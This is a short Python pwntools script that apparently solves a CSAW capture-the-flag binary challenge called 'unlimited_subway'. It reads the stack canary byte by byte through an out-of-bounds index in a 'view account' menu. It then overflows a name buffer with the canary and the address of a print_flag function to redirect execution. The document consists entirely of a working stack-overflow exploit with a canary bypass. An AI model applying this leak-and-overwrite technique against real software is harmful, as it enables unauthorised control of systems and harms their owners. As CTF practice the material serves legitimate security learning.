from pwn import *

path_to_binary = "./challenge/unlimited_subway"
EXE = ELF(path_to_binary)
print_flag_address = EXE.symbols['print_flag']

def conn(use_exe = False):
	if use_exe:
		r = process([EXE.path])
	else:
		r = remote("pwn.csaw.io", 7900)
	return r

context.binary = EXE
context.log_level = "DEBUG"

io = conn(False)

# Use the view account option to read the value of the stack canary
canary = b''
for i in range(4):
    io.recvuntil(b'> ')
    io.sendline(b'V')
    io.recvuntil(b'Index : ')
    payload = str(0x88 - 8 + i)
    io.sendline(payload)
    io.recvuntil(b' : ')
    canary = io.recvline()[:-1] + canary
canary = int(canary, 16)

io.recvuntil(b'> ')
io.sendline(b'E')

io.recvuntil(b'Name Size : ')
io.sendline(str(0x48+4).encode())
io.recvuntil(b'Name : ')
payload = p32(canary) * 0x12
payload += p32(print_flag_address)
io.sendline(payload)

io.interactive()

io.close()